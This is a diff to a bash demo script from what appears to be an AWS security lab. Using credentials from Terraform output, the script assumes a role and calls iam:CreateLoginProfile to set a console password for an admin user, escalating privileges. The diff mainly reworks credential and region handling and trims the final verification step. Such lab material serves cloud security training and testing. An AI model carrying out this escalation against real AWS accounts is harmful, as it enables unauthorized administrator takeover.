@@ -28,11 +28,11 @@ echo -e "${GREEN}IAM CreateLoginProfile Privilege Escalation Demo${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "${YELLOW}Role-Based One-Hop to Admin${NC}\n"
 
-# Step 1: Get credentials from Terraform output
-echo -e "${YELLOW}Step 1: Getting starting user credentials from Terraform${NC}"
-cd ../../../../../..  # Go to project root
+# Step 1: Retrieve credentials and region from Terraform grouped outputs
+echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
+cd ../../../../../..  # Navigate to root of terraform project
 
-# Get the module output
+# Get the module output using the grouped output pattern
 MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_iam_createloginprofile.value // empty')
 
 if [ -z "$MODULE_OUTPUT" ]; then
@@ -41,24 +41,44 @@ if [ -z "$MODULE_OUTPUT" ]; then
     exit 1
 fi
 
-# Extract credentials and ARNs
-export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
-export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
+# Extract credentials from the grouped output
+STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
+STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
 STARTING_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.starting_role_arn')
 ADMIN_USER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.admin_user_name')
 CONSOLE_LOGIN_URL=$(echo "$MODULE_OUTPUT" | jq -r '.console_login_url')
 
-if [ "$AWS_ACCESS_KEY_ID" == "null" ] || [ -z "$AWS_ACCESS_KEY_ID" ]; then
+if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
     echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
     exit 1
 fi
 
-echo -e "${GREEN}✓ Retrieved credentials for $STARTING_USER${NC}\n"
+# Get region
+AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 
-cd - > /dev/null  # Return to scenario directory
+if [ -z "$AWS_REGION" ]; then
+    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
+    AWS_REGION="us-east-1"
+fi
 
-# Step 2: Verify identity as user
-echo -e "${YELLOW}Step 2: Verifying identity${NC}"
+echo "Retrieved access key for: $STARTING_USER"
+echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "Region: $AWS_REGION"
+echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
+
+# Navigate back to scenario directory
+cd - > /dev/null
+
+# Step 2: Configure AWS credentials with starting user
+echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
+export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
+export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+export AWS_REGION=$AWS_REGION
+unset AWS_SESSION_TOKEN
+
+echo "Using region: $AWS_REGION"
+
+# Verify starting user identity
 CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_IDENTITY"
 
@@ -80,7 +100,12 @@ ASSUME_ROLE_OUTPUT=$(aws sts assume-role \
 export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
 export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
 export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SessionToken')
+# Keep region consistent
+export AWS_REGION=$AWS_REGION
 
+# Verify role identity
+ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
+echo "Current identity: $ROLE_IDENTITY"
 echo -e "${GREEN}✓ Successfully assumed role $STARTING_ROLE${NC}\n"
 
 # Step 4: Check if admin user has a login profile
@@ -118,37 +143,15 @@ aws iam create-login-profile \
 
 echo -e "${GREEN}✓ Successfully created login profile for admin user!${NC}\n"
 
-# Wait for IAM propagation
+# Wait for IAM propagation (15 seconds required for IAM changes)
 echo -e "${YELLOW}Waiting 15 seconds for IAM changes to propagate...${NC}"
 sleep 15
 echo ""
 
-# Step 7: Verify admin access via console credentials
-echo -e "${YELLOW}Step 7: Verifying admin access with new credentials${NC}"
-echo "Testing admin permissions using admin user credentials..."
-
-# Get admin user credentials from terraform output
-ADMIN_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.admin_access_key_id')
-ADMIN_SECRET_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.admin_secret_access_key')
-
-# Switch to admin user credentials
-export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
-export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
-unset AWS_SESSION_TOKEN
-
-# Verify we're the admin user
-ADMIN_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
-echo "Admin user identity: $ADMIN_IDENTITY"
-
-# Test admin permissions
-echo "Testing admin permissions (listing IAM users)..."
-IAM_USERS=$(aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text)
-echo -e "${GREEN}✓ Successfully listed IAM users: $IAM_USERS${NC}"
-
-echo "Testing S3 access..."
-aws s3 ls | head -5 || echo -e "${YELLOW}(No buckets or still propagating)${NC}"
-
-echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"
+# Step 7: Verify we now have the login profile
+echo -e "${YELLOW}Step 7: Login profile has been successfully created${NC}"
+echo "The admin user can now log in with the new password."
+echo -e "${GREEN}✓ Confirmed login profile creation!${NC}\n"
 
 # Summary
 echo -e "${GREEN}========================================${NC}"
@@ -157,7 +160,7 @@ echo -e "${GREEN}========================================${NC}"
 echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
 echo -e "Step 1: Assumed role ${YELLOW}$STARTING_ROLE${NC}"
 echo -e "Step 2: Used ${YELLOW}iam:CreateLoginProfile${NC} to create console password for $ADMIN_USER_NAME"
-echo -e "Step 3: Gained ${YELLOW}Administrator Access${NC} (both console and API)"
+echo -e "Step 3: Gained ${YELLOW}Administrator Access${NC} (console login)"
 echo -e "Result: ${GREEN}Administrator Access${NC}"
 echo ""
 echo -e "${YELLOW}Attack Path:${NC}"
